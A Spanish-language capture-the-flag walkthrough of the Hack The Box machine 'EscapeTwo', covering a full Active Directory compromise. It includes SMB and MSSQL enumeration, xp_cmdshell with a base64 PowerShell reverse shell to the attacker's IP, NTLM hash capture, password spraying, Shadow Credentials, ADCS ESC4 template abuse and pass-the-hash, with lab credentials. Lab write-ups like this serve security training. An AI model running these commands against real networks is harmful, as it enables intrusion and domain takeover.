# EscapeTwo

![](../../../../~gitbook/image.md)Publicado: 2 de Julio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
OS: Windows
### 📝 Descripción
Sequel es una máquina Windows de dificultad fácil que simula un entorno de Active Directory corporativo. La explotación comienza con credenciales válidas proporcionadas para el usuario `rose`, las cuales nos permiten enumerar recursos SMB y descubrir archivos Excel con credenciales adicionales de usuarios y servicios.La fase inicial involucra la enumeración de servicios como MSSQL, donde obtenemos acceso con la cuenta privilegiada `sa` y aprovechamos `xp_cmdshell` para ejecutar comandos del sistema. A través de técnicas de Password Spraying, logramos movimiento lateral hacia la cuenta `ryan`, que posee privilegios especiales sobre el objeto `ca_svc` en Active Directory.La escalada de privilegios se realiza mediante ADCS (Active Directory Certificate Services) abuse, específicamente explotando la vulnerabilidad ESC4 que permite modificar plantillas de certificados. Utilizando técnicas de Shadow Credentials y manipulación de ACLs, transformamos una plantilla vulnerable en ESC1 para finalmente obtener un certificado válido de administrador de dominio.
### 🎯 Puntos Clave
- ✅ Enumeración inicial con credenciales válidas de `rose`
- ✅ Descubrimiento de credenciales en archivos Excel del recurso SMB
- ✅ Explotación de MSSQL con cuenta privilegiada `sa`
- ✅ Ejecución de comandos mediante `xp_cmdshell`
- ✅ Movimiento lateral via Password Spraying hacia `ryan`
- ✅ Abuso de privilegios WriteOwner sobre `ca_svc`
- ✅ Shadow Credentials attack para tomar control de cuentas
- ✅ ADCS ESC4 → ESC1 para escalada de privilegios
- ✅ Obtención de certificado de administrador de dominio

### 🔍 Información de la Máquina
CampoValorIP10.10.11.51Dominiosequel.htbDCDC01.sequel.htbOSWindows Server 2019Servicios PrincipalesDNS, Kerberos, LDAP, SMB, MSSQL, WinRM
### 🔭 Reconocimiento

#### 🏓 Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
#### 🚀 Escaneo de puertos

#### 🔍 Enumeración de servicios
⚠️ Añadimos el siguiente vhost a nuestro fichero /etc/hosts:
#### 📋 Análisis de Servicios Detectados
La máquina expone varios servicios típicos de un Domain Controller:- Puerto 53 (DNS): Resolución de nombres del dominio
- Puerto 88 (Kerberos): Autenticación del dominio
- Puerto 389/636 (LDAP): Directorio activo
- Puerto 445 (SMB): Recursos compartidos
- Puerto 1433 (MSSQL): Base de datos SQL Server
- Puerto 5985 (WinRM): Administración remota

#### 🔑 Credenciales Iniciales
Como es común en las pruebas de penetración de Windows de la vida real, iniciará el cuadro de Administrador con las credenciales de la siguiente cuenta:- Nombre de usuario: rose
- Contraseña: KxEPkKe6R8su

### 🌐 Enumeración de Servicios

#### 🏠 53 DNS
🧠 Desglose de flags y argumentos:Flag/ArgumentoSignificado`-r`Desactiva la resolución inversa (no intenta hacer reverse lookup de IPs).`--dnsserver 10.10.11.51`Usa el servidor DNS 10.10.11.51 en lugar del predeterminado del sistema.`--enum`Activa enumeración completa, que incluye subdominios, transferencias de zona, etc.`-p 0`Desactiva la enumeración de hosts con nombres similares (`similar domain guessing`).`-s 0`Desactiva el escaneo de servicios (no intenta verificar si hay servicios activos en los subdominios).`-f /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt`Utiliza este diccionario de subdominios para hacer fuerza bruta de nombres.`sequel.htb`Es el dominio objetivo para la enumeración.En esta ocasión no encontramos nada relevante.
#### 🗂️ 445 SMB - Enumeración Inicial
Ya que disponemos de credenciales, comenzamos tratando de enumerar recursos compartidos, usuarios etc:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
#### 🎫 Kerberoasting
Con las credenciales de rose, verificamos si hay alguna cuenta kerberoastable de la cual podamos obtener su TGS![](../../../../~gitbook/image.md)Obtenemos dos TGS, uno para la cuenta del usuario sql_svc y otro para ca_svc. Intentamos crackear offline con hashcat pero las contraseñas no están en rockyou.txt.
#### 🗃️ 1433 MSSQL
Confirmamos que las credenciales del usuario rose son válidas con este servicio usando impacket-mssqlclient con la flag -windows-auth para usar NTLM (Windows Authentication)📊 Enumeración de la versión de base de datos❌ Intento fallido de habilitar xp_cmd_shellEl usuario rose no tiene permisos para habilitar xp_cmdshell:🎣 Captura de hash NTLMIniciamos un servidor SMB e intentamos capturar credenciales mediante una petición a un recurso inexistente:Desde la consola MSSQL ejecutamos:![](../../../../~gitbook/image.md)Obtenemos el hash NTLMv2 del usuario sql_svc, pero no es crackeable con rockyou.📁 Explorando recursos compartidosMontamos los recursos SMB para explorar su contenido:Encontramos archivos Excel con credenciales:🔓 Extracción de credenciales de archivos ExcelEn Excel 2007, los archivos XLSX sustituyeron a los archivos .XLS como archivo estándar para guardar hojas de cálculo en Excel. A diferencia de los archivos XLS, que almacenan los datos de la hoja de cálculo en un único archivo binario, los archivos XLSX se guardan en formato Open XML, que almacena los datos como archivos y carpetas independientes en un paquete Zip comprimido. El archivo incluye el fichero [Content_Types].xml, que describe la hoja de cálculo, y un fichero .XML para cada hoja de cálculo.Esto significa que podemos extraer manualmente el archivo en nuestro host para ver el contenido de cada una de las hojas.Como alternativa es posible usar algunas herramienta en línea como:- [https://jumpshare.com/viewer/xlsx](https://jumpshare.com/viewer/xlsx)![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Analizando el contenido de los archivos XLSX (formato Open XML comprimido), obtenemos las siguientes credenciales:First NameLast NameEmailUsernamePasswordAngelaMartinangela@sequel.htbangela0fwz7Q4mSpurIt99OscarMartinezoscar@sequel.htboscar86LxLBMgEWaKUnBGKevinMalonekevin@sequel.htbkevinMd9Wlq1E5bZnVDVoNULLNULLsa@sequel.htbsaMSSQLP@ssw0rd!
### 💀 Explotación Inicial

#### 🔐 Acceso con cuenta sa en MSSQL
Probamos las credenciales de la cuenta sa (System Administrator) en MSSQL:✅ Éxito! La cuenta sa tiene privilegios elevados.
#### ⚙️ Habilitando xp_cmdshell
Con privilegios de sa podemos habilitar la ejecución de comandos:
#### 🚀 Obteniendo Reverse Shell
Generamos un payload de PowerShell codificado en base64 para obtener una reverse shell:![](../../../../~gitbook/image.md)Obtenemos acceso como usuario `sql_svc`:
### 🔄 Movimiento Lateral

#### 🔍 Enumeración del sistema
Usamos bloodhound-python como collector para obtener los objetos de dominio y cargarlos en bloodhound para analizar posibles vías potenciales para el movimiento lateral o escalada:Durante la enumeración del sistema encontramos credenciales adicionales en el archivo `C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI`:![](../../../../~gitbook/image.md)Credencial encontrada: `sql_svc:WqSZAF6CysDQbGb3`
#### 💥 Password Spraying
Verificamos si algún usuario reutiliza esta contraseña usando netexec:![](../../../../~gitbook/image.md)¡Bingo! El usuario `ryan` está reutilizando la contraseña de `sql_svc`.
#### 🎯 Acceso como ryan
![](../../../../~gitbook/image.md)Obtenemos la primera flag (user.txt) y confirmamos que ryan pertenece al grupo Certificate Service DCOM Access.
### 🔝 Escalada de Privilegios

#### 🩸 Análisis con BloodHound
Usando bloodhound-python recopilamos información del dominio:![](../../../../~gitbook/image.md)Hallazgo crítico: El usuario ryan tiene privilegio WriteOwner sobre el objeto CA_SVC.
#### Tomando el control de ca_svc
🎯 Contexto InicialComo usuario ryan, tenemos el privilegio WriteOwner sobre CA_SVC, lo que nos convierte en propietarios de la cuenta y nos permite escalar privilegios.📋 Introducción al privilegio WriteOwnerEl privilegio WriteOwner nos permite diferentes tipos de ataques dependiendo del objeto:Tipo de ObjetoCapacidadesUsuarioAsignar todos los derechos a otra cuenta para realizar: restablecimiento de contraseña, Kerberoasting dirigido, o Shadow CredentialsGrupoAñadir/eliminar miembros después de conceder privilegios totales al nuevo propietarioGPOModificar la política de grupo💡 Preferencia: Utilizaremos Kerberoasting dirigido o Shadow Credentials para evitar cambiar contraseñas de usuarios innecesariamente.🎯 OPCIÓN 1: Targeted KerberoastingPrerrequisitosPara realizar un ataque de kerberoasting necesitamos uno de estos privilegios:- ✅ `WriteOwner` (tenemos este)
- `GenericAll`
- `GenericWrite`
- `WriteProperty`
- `Validated-SPN`
- `WriteProperties`

#### 🔧 Proceso del Ataque
Funcionamiento:- Adjuntar/generar un SPN para la cuenta de usuario
- Solicitar TGS para la cuenta de usuario
- Crackear el TGS (encriptado con el hash NTLM)

#### 💻 Ejecución
Herramienta utilizada: [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)![](../../../../~gitbook/image.md)
#### 🔐 Intento de Cracking
![](../../../../~gitbook/image.md)❌ Resultado: La contraseña no se encuentra en rockyou.txt
#### 🎯 OPCIÓN 2: Shadow Credentials + ADCS Abuse
📖 Conceptos Clave- Shadow Credentials: Modificación del atributo `msDS-KeyCredentialLink` para agregar claves controladas por el atacante
- ADCS Abuse: Explotación de plantillas de certificados mal configuradas para emitir certificados válidos
🚀 Proceso de escaladaPaso 1: Modificar el propietarioConceder a `Ryan` control total sobre `ca_svc`![](../../../../~gitbook/image.md)Paso 2: Garantizar privilegios totalesAsegurar que `ryan` tenga FullControl sobre `ca_svc`![](../../../../~gitbook/image.md)Paso 3: Generar Shadow CredentialsCrear nuevas credenciales para autenticación basada en certificados![](../../../../~gitbook/image.md)Paso 4: Buscar plantillas vulnerables![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
#### 🔥 ESC4 (vía ESC1)

#### 📊 Análisis de Vulnerabilidad
ESC4 ocurre cuando existen controles de acceso débiles en una plantilla de certificado.🔍 Hallazgo: El grupo de editores de certificados tiene control total sobre la plantilla DunderMifflinAuthentication.
#### 🛠️ Explotación
Versión Certipy 4.8.2Paso 5: Modificar plantillaResultado esperado:Paso 6: Solicitar certificado de administradorResultado esperado:Versión Certipy 5.0.2Paso 5: Modificar plantilla (nueva sintaxis)![](../../../../~gitbook/image.md)Paso 6: Solicitar certificado
#### 🏆 Fase Final: Obtención de Acceso Administrativo
Paso 7: Recuperar hash NTLM del administrador![](../../../../~gitbook/image.md)Paso 8: Pass-the-Hash para acceso completo✅ Verificación de AccesoLast updated 9 months ago- [📝 Descripción](#descripcion)
- [🎯 Puntos Clave](#puntos-clave)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración de Servicios](#enumeracion-de-servicios-1)
- [💀 Explotación Inicial](#explotacion-inicial)
- [🔄 Movimiento Lateral](#movimiento-lateral)
- [🔝 Escalada de Privilegios](#escalada-de-privilegios)

```
❯ ping -c2 10.10.11.51
PING 10.10.11.51 (10.10.11.51) 56(84) bytes of data.
64 bytes from 10.10.11.51: icmp_seq=1 ttl=127 time=44.2 ms
64 bytes from 10.10.11.51: icmp_seq=2 ttl=127 time=43.9 ms

--- 10.10.11.51 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 43.910/44.051/44.192/0.141 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.51 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001,49664,49665,49666,49668,49681,49682,49683,49698,49714,49735,49802
```

```
nmap -sC -sV -p$ports 10.10.11.51 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 18:09 CEST
Nmap scan report for 10.10.11.51
Host is up (0.042s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-01 16:09:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:34:57
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2025-07-01T16:10:44+00:00; +1s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:34:57
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2025-07-01T16:10:44+00:00; +1s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info:
|   10.10.11.51:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info:
|   10.10.11.51:1433:
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-07-01T16:10:44+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-07-01T16:01:57
|_Not valid after:  2055-07-01T16:01:57
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-01T16:10:44+00:00; +1s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:34:57
|_Not valid after:  2124-06-08T17:00:40
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-01T16:10:44+00:00; +1s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:34:57
|_Not valid after:  2124-06-08T17:00:40
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49682/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
49735/tcp open  msrpc         Microsoft Windows RPC
49802/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-07-01T16:10:09
|_  start_date: N/A
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
```

```
echo "10.10.11.51 sequel.htb DC01.sequel.htb" | sudo tee -a /etc/hosts
```

```
dnsenum -r --dnsserver 10.10.11.51 --enum -p 0 -s 0 -f /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt sequel.htb
```

```
netexec smb 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' --shares
netexec smb 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' --users
netexec smb 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' --rid-brute 2>/dev/null | awk -F '\\' '{print $2}' | grep 'SidTypeUser' | sed 's/ (SidTypeUser)//' > Users.txt
```

```
impacket-GetUserSPNs sequel.htb/rose:'KxEPkKe6R8su' -dc-ip sequel.htb -request
```

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName     Name     MemberOf                                              PasswordLastSet             LastLogon                   Delegation
-----------------------  -------  ----------------------------------------------------  --------------------------  --------------------------  ----------
sequel.htb/sql_svc.DC01  sql_svc  CN=SQLRUserGroupSQLEXPRESS,CN=Users,DC=sequel,DC=htb  2024-06-09 09:58:42.689521  2025-07-01 18:01:54.892948
sequel.htb/ca_svc.DC01   ca_svc   CN=Cert Publishers,CN=Users,DC=sequel,DC=htb          2025-07-01 18:27:29.134331  2024-06-09 19:14:42.333365

[-] CCache file is not found. Skipping...
$krb5tgs$23$*sql_svc$SEQUEL.HTB$sequel.htb/sql_svc*$[...]
$krb5tgs$23$*ca_svc$SEQUEL.HTB$sequel.htb/ca_svc*$[...]
```

```
impacket-mssqlclient rose:KxEPkKe6R8su@sequel.htb -windows-auth
```

```
SQL (SEQUEL\rose  guest@master)> SELECT @@VERSION;

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
Sep 24 2019 13:48:23
Copyright (C) 2019 Microsoft Corporation
Express Edition (64-bit) on Windows Server 2019 Standard 10.0  (Build 17763: ) (Hypervisor)
```

```
SQL (SEQUEL\rose  guest@master)> enable_xp_cmdshell
ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
```

```
impacket-smbserver smbShare $(pwd) -smb2support
```

```
EXEC master..xp_dirtree '\\10.10.14.9\smbShare\'
```

```
sudo mount -t cifs //10.10.11.51/'Accounting Department' /mnt/monturaSmb -o 'username=rose,password=KxEPkKe6R8su'
```

```
ls /mnt/monturaSmb
accounting_2024.xlsx   accounts.xlsx
```

```

0123456789101112131415161718192020212223&C&"Times New Roman,Regular"&12&A&C&"Times New Roman,Regular"&12Page &P
```

```
impacket-mssqlclient sa:'MSSQLP@ssw0rd!'@sequel.htb
```

```
SQL (sa  dbo@master)> enable_xp_cmdshell
SQL (sa  dbo@master)> RECONFIGURE
```

```
EXEC xp_cmdshell 'powershell -e [base64_payload]'
```

```
EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOQAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'

```

```
nc -nlvp 443
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.51] 58115
whoami
sequel\sql_svc
```

```
bloodhound-python -u 'rose' -p 'KxEPkKe6R8su' -d sequel.htb -c All --zip -ns 10.10.11.51
```

```
netexec winrm 10.10.11.51 -u Users.txt -p 'WqSZAF6CysDQbGb3'
```

```
evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'
```

```
bloodhound-python -u 'rose' -p 'KxEPkKe6R8su' -d sequel.htb -c All --zip -ns 10.10.11.51
```

```
# Comando genérico
python3 targetedKerberoast.py -v -d $domain -u $user -p $pass --request-user ca_svc -o ca_svc.kerb

# Comando específico
python3 targetedKerberoast.py -v -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 --request-user ca_svc -o ca_svc.kerb
```

```
hashcat -m 13100 ca_svc.kerb /usr/share/wordlists/rockyou.txt
```

```
# Opción A: bloodyAD
bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner CA_SVC ryan

# Opción B: impacket-owneredit
impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' sequel.htb/ryan:WqSZAF6CysDQbGb3
```

```
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"
```

```
certipy-ad shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51' -target dc01.sequel.htb -ns 10.10.11.51
```

```
certipy-ad find -u 'ca_svc@sequel.htb' -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -stdout -vulnerable
```

```
certipy template -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -target dc01.sequel.htb -save-old
```

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)
[*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
```

```
certipy req -ca sequel-DC01-CA -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb
```

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 5
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

```
certipy-ad template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration -no-save
```

```
certipy-ad req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb
```

```
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51
```

```
evil-winrm -i 10.10.11.51 -u administrator -H ""
```

```
Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
